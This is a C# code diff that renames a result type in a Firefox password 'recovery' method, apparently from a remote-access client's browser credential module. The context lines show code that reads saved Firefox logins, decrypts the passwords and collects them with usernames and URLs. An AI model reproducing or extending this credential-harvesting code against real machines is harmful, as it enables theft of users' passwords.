@@ -5,6 +5,7 @@ using System.IO;
 using System.Runtime.InteropServices;
 using System.Text;
 using Microsoft.Win32;
+using xClient.Core.Data;
 using xClient.Core.Recovery.Utilities;
 using xClient.Core.Utilities;
 
@@ -55,10 +56,10 @@ namespace xClient.Core.Recovery.Browsers
         /// Recover Firefox Passwords from logins.json
         /// </summary>
         /// <returns>List of Username/Password/Host</returns>
-        public static List<LoginInfo> GetSavedPasswords()
+        public static List<RecoveredAccount> GetSavedPasswords()
         {
 
-            List<LoginInfo> firefoxPasswords = new List<LoginInfo>();
+            List<RecoveredAccount> firefoxPasswords = new List<RecoveredAccount>();
             try
             {
                 // init libs
@@ -78,7 +79,7 @@ namespace xClient.Core.Recovery.Browsers
                     string password = Decrypt(data.encryptedPassword);
                     Uri host = new Uri(data.formSubmitURL);
 
-                    firefoxPasswords.Add(new LoginInfo() { URL = host.AbsoluteUri, Username = username, Password = password, Application = "Firefox" });
+                    firefoxPasswords.Add(new RecoveredAccount() { URL = host.AbsoluteUri, Username = username, Password = password, Application = "Firefox" });
                 }
             }
             catch (Exception)
